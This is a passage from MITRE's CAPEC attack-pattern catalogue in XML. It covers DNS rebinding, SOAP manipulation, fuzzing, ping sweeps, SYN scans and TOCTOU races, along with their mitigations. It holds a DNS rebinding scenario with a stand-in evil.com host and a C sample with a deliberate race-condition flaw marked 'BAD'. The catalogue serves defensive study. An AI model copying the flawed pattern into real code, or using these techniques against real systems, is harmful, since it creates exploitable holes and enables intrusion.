               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: IP Pinning causes browsers to record the IP address to which a given name resolves and continue using this address regardless of the TTL set in the DNS response. Unfortunately, this is incompatible with the design of some legitimate sites.</Mitigation>
            <Mitigation>Implementation: Reject HTTP request with a malicious Host header.</Mitigation>
            <Mitigation>Implementation: Employ DNS resolvers that prevent external names from resolving to internal addresses.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The adversary registers a domain name, such as www.evil.com with IP address 1.3.5.7, delegates it to his own DNS server (1.3.5.2), and uses phishing links or emails to get HTTP traffic. Instead of sending a normal TTL record, the DNS server sends a very short TTL record (for example, 1 second), preventing DNS response of entry[www.evil.com, 1.3.5.7] from being cached on victim's (192.168.1.10) browser. The adversary's server first responds to the victim with malicious script such as JavaScript, containing IP address (1.3.5.7) of the server. The adversary uses XMLHttpRequest (XHR) to send HTTP request or HTTPS request directly to the adversary's server and load response. The malicious script allows the adversary to rebind the host name to the IP address (192.168.1.2) of a target server that is behind the firewall. Then the server responds to the adversary's real target, which is an internal host IP (192.168.1.2) in the same domain of the victim (192.168.1.10). Because the same name resolves to both these IP addresses, browsers will place both IP addresses (1.3.5.7 and 192.168.1.2) in the same security zone and allow information to flow between the addresses. Further, the adversary can achieve scanning and accessing all internal hosts in the victim's local network (192.168.X.X) by sending multiple short-lived IP addresses.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="350"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-119"/>
            <Reference External_Reference_ID="REF-120" Section="DNS rebinding"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Payload, Related_Attack_Patterns, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences, Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="276" Name="Inter-component Protocol Manipulation" Abstraction="Standard" Status="Draft">
         <Description>Inter-component protocols are used to communicate between different software and hardware modules within a single computer. Common examples are: interrupt signals and data pipes. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="272"/>
         </Related_Attack_Patterns>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="277" Name="Data Interchange Protocol Manipulation" Abstraction="Standard" Status="Draft">
         <Description>Data Interchange Protocols are used to transmit structured data between entities. These protocols are often specific to a particular domain (B2B: purchase orders, invoices, transport logistics and waybills, medical records). They are often, but not always, XML-based. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="272"/>
         </Related_Attack_Patterns>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="278" Name="Web Services Protocol Manipulation" Abstraction="Standard" Status="Draft">
         <Description>An adversary manipulates a web service related protocol to cause a web application or service to react differently than intended. This can either be performed through the manipulation of call parameters to include unexpected values, or by changing the called function to one that should normally be restricted or limited. By leveraging this pattern of attack, the adversary is able to gain access to data or resources normally restricted, or to cause the application or service to crash.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="272"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted application or service must rely on web service protocols in such a way that malicious manipulation of them can alter functionality.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The attacker must be able to manipulate the communications to the targeted application or service.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Range, size and value and consistency verification for any arguments supplied to applications and services from external sources and devise appropriate error response.</Mitigation>
            <Mitigation>Design: Ensure that function calls that should not be called by an unprivileged user are not accessible to them.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="279" Name="SOAP Manipulation" Abstraction="Detailed" Status="Draft">
         <Description>Simple Object Access Protocol (SOAP) is used as a communication protocol between a client and server to invoke web services on the server. It is an XML-based protocol, and therefore suffers from many of the same shortcomings as other XML-based protocols. Adviseries can make use these shortcomings to mount an denial of service attack, disclose information and execute arbitrary code. This includes a SOAP parameter tampering attack in which an attacker sends a SOAP message where the field values are other than what the server is likely to expect in order to precipitate non-standard server behavior.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="278"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An application uses SOAP-based web service api.</Prerequisite>
            <Prerequisite>An application does not perform sufficient input validation to ensure that user-controllable data is safe for an XML parser.</Prerequisite>
            <Prerequisite>The targeted server either fails to verify that data in SOAP messages conforms to the appropriate XML schema, or it fails to correctly handle the complete range of data allowed by the schema.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
         </Consequences>
         <Example_Instances>
            <Example>An attacker could mount a recursive payload attack, which involves deep nesting of XML elements. This can cause XML parser to failed due to a buffer overflow, or even cause it crash, enabling a denial of service attack.</Example>
            <Example>A lack of a character limit for a field can allow oversized data to be sent, causing a buffer overflow.</Example>
            <Example>The contents of a text field could contain metacharacters or contextually inappropriate data (for example, sending a non-existent product name in a product name field or using an out-of-order sequence number).</Example>
            <Example>An adversary corrupts or modifies the content of XML schema for the purpose of undermining the security of the target.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-121"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description, Description Summary, Examples-Instances, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">Soap Manipulation</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="28" Name="Fuzzing" Abstraction="Meta" Status="Draft">
         <Description>In this attack pattern, the adversary leverages fuzzing to try to identify weaknesses in the system. Fuzzing is a software security and functionality testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occurred. Fuzzing treats the system as a black box and is totally free from any preconceptions or assumptions about the system. Fuzzing can help an attacker discover certain assumptions made about user input in the system. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions despite not necessarily knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve his goals.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Observe communication and inputs] The fuzzing attacker observes the target system looking for inputs and communications between modules, subsystems, or systems.</Description>
               <Technique>Network sniffing. Using a network sniffer such as wireshark, the attacker observes communications into and out of the target system.</Technique>
               <Technique>Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the attacker observes the system calls and API calls that are made by the target system, and the nature of their parameters.</Technique>
               <Technique>Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.</Description>
               <Technique>Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).</Technique>
               <Technique>Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs, determine why that happened. Figure out the underlying assumption that was invalidated by the input.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Craft exploit payloads] Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.</Description>
               <Technique>Identify and embed shell code for the target system.</Technique>
               <Technique>Embed higher level attack commands in the payload. (e.g., SQL, PHP, server-side includes, etc.)</Technique>
               <Technique>Induce denial of service by exploiting resource leaks or bad error handling.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Skills_Required>
            <Skill Level="Low">There is a wide variety of fuzzing tools available.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Fuzzing tools.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>A lot of invalid data is fed to the system. Data that cannot have been generated through a legitimate transaction/request. Data is coming into the system within a short period of time and potentially from the same IP.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Test to ensure that the software behaves as per specification and that there are no unintended side effects. Ensure that no assumptions about the validity of data are made.</Mitigation>
            <Mitigation>Use fuzz testing during the software QA process to uncover any surprises, uncover any assumptions or unexpected behavior.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A fuzz test reveals that when data length for a particular field exceeds certain length, the input validation filter fails and lets the user data in unfiltered. This provides an attacker with an injection vector to deliver the malicious payload into the system.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="388"/>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="285" Name="ICMP Echo Request Ping" Abstraction="Detailed" Status="Stable">
         <Description>An adversary sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss. Performing this operation for a range of hosts on the network is known as a 'Ping Sweep'. While the Ping utility is useful for small-scale host discovery, it was not designed for rapid or efficient host discovery over large network blocks. Other scanning utilities have been created that make ICMP ping sweeps easier to perform. Most networks filter ingress ICMP Type 8 messages for security reasons. Various other methods of performing ping sweeps have developed as a result. It is important to recognize the key security goal of the adversary is to discover if an IP address is alive, or has a responsive host. To this end, virtually any type of ICMP message, as defined by RFC 792 is useful. An adversary can cycle through various types of ICMP messages to determine if holes exist in the firewall configuration. When ICMP ping sweeps fail to discover hosts, other protocols can be used for the same purpose, such as TCP SYN or ACK segments, UDP datagrams sent to closed ports, etc.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to send an ICMP type 8 query (Echo Request) to a remote target and receive an ICMP type 0 message (ICMP Echo Reply) in response. Any firewalls or access control lists between the sender and receiver must allow ICMP Type 8 and ICMP Type 0 messages in order for a ping operation to succeed.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary needs to know certain linux commands for this type of attack.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Scanners or utilities that provide the ability to send custom ICMP queries.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>A successful attack of this kind can identify open ports and available services on a system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Consider configuring firewall rules to block ICMP Echo requests and prevent replies. If not practical, monitor and consider action when a system has fast and a repeated pattern of requests that move incrementally through port numbers.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pp. 44-51"/>
            <Reference External_Reference_ID="REF-123"/>
            <Reference External_Reference_ID="REF-124"/>
            <Reference External_Reference_ID="REF-125"/>
            <Reference External_Reference_ID="REF-34" Section="Section 3.5.2 Ping Scan (-SP), pg. 58"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="287" Name="TCP SYN Scan" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses a SYN scan to determine the status of ports on the remote target. SYN scanning is the most common type of port scanning that is used because of its enormous advantages and few drawbacks. As a result, novice attackers tend to overly rely on the SYN scan while performing system reconnaissance. As a scanning method, the primary advantages of SYN scanning are its universality and speed. RFC 793 defines the required behavior of any TCP/IP device in that an incoming connection request begins with a SYN packet, which in turn must be followed by a SYN/ACK packet from the receiving service. For this reason, like TCP Connect scanning, SYN scanning works against any TCP stack. Unlike TCP Connect scanning, it is possible to scan thousands of ports per second using this method. This type of scanning is usually referred to as 'half-open' scanning because it does not complete the three-way handshake. The scanning rate is extremely fast because no time is wasted completing the handshake or tearing down the connection. TCP SYN scanning can also immediately detect 3 of the 4 important types of port status: open, closed, and filtered. When a SYN is sent to an open port and unfiltered port, a SYN/ACK will be generated. This technique allows an attacker to scan through stateful firewalls due to the common configuration that TCP SYN segments for a new connection will be allowed for almost any port. When a SYN packet is sent to a closed port a RST is generated, indicating the port is closed. When SYN scanning to a particular port generates no response, or when the request triggers ICMP Type 3 unreachable errors, the port is filtered. A TCP Connect scan has the following characteristics:</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="300"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This scan type is not possible with some operating systems (Windows XP SP 2). On Linux and Unix systems it requires root privileges to use raw sockets.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The ability to send TCP SYN segments to a host during network reconnaissance via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>A successful attack of this kind can identify open ports and available services on a system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-34" Section="Section 5.32 TCP SYN (Stealth) Scan, pg. 100"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Description, Description Summary, References, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="29" Name="Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. A typical example is file access. The adversary can leverage a file access race condition by "running the race", meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary could replace or modify the file, causing the application to behave unexpectedly.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="26"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The adversary explores to gauge what level of access he has.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The adversary confirms access to a resource on the target host. The adversary confirms ability to modify the targeted resource.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The adversary decides to leverage the race condition by "running the race", meaning that he would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary can replace the resource and cause an escalation of privilege.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>A resource is access/modified concurrently by multiple processes.</Prerequisite>
            <Prerequisite>The adversary is able to modify resource.</Prerequisite>
            <Prerequisite>A race condition exists while accessing a resource.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">This attack can get sophisticated since the attack has to occur within a short interval of time.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use safe libraries to access resources such as files.</Mitigation>
            <Mitigation>Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.</Mitigation>
            <Mitigation>Use synchronization to control the flow of execution.</Mitigation>
            <Mitigation>Use static analysis tools to find race conditions.</Mitigation>
            <Mitigation>Pay attention to concurrency problems related to the access of resources.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057</Example>
            <Example>
               <xhtml:p>The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an adversary can replace the file referenced by the name.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="bad">include &lt;sys/types.h&gt;<xhtml:br/>include &lt;fcntl.h&gt;<xhtml:br/>include &lt;unistd.h&gt;<xhtml:br/>
                  <xhtml:br/>define FILE "/tmp/myfile"<xhtml:br/>define UID 100<xhtml:br/>
                  <xhtml:br/>void test(char *str)<xhtml:br/>{<xhtml:div style="margin-left:10px;">int fd;<xhtml:br/>fd = creat(FILE, 0644);<xhtml:br/>if(fd == -1)<xhtml:div style="margin-left:10px;">return;</xhtml:div>
                     <xhtml:br/>chown(FILE, UID, -1); /* BAD */<xhtml:br/>close(fd);</xhtml:div>
                  <xhtml:br/>}<xhtml:br/>
                  <xhtml:br/>int main(int argc, char **argv)<xhtml:br/>{<xhtml:div style="margin-left:10px;">char *userstr;<xhtml:br/>if(argc &gt; 1) {<xhtml:div style="margin-left:10px;">userstr = argv[1];<xhtml:br/>test(userstr);</xhtml:div>
                     <xhtml:br/>}<xhtml:br/>return 0;</xhtml:div>
                  <xhtml:br/>}</xhtml:div>
               <xhtml:p>[R.29.3]</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="367"/>
            <Related_Weakness CWE_ID="368"/>
            <Related_Weakness CWE_ID="366"/>
            <Related_Weakness CWE_ID="370"/>
            <Related_Weakness CWE_ID="362"/>
            <Related_Weakness CWE_ID="662"/>
            <Related_Weakness CWE_ID="691"/>
            <Related_Weakness CWE_ID="663"/>
            <Related_Weakness CWE_ID="665"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-131"/>
            <Reference External_Reference_ID="REF-107" Section="Test Case ID 1598"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="290" Name="Enumerate Mail Exchange (MX) Records" Abstraction="Detailed" Status="Stable">
         <Description>An adversary enumerates the MX records for a given via a DNS query. This type of information gathering returns the names of mail servers on the network. Mail servers are often not exposed to the Internet but are located within the DMZ of a network protected by a firewall. A side effect of this configuration is that enumerating the MX records for an organization my reveal the IP address of the firewall or possibly other internal systems. Attackers often resort to MX record enumeration when a DNS Zone Transfer is not possible.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="309"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary requires access to a DNS server that will return the MX records for a network.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A command-line utility or other application capable of sending requests to the DNS server is necessary.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
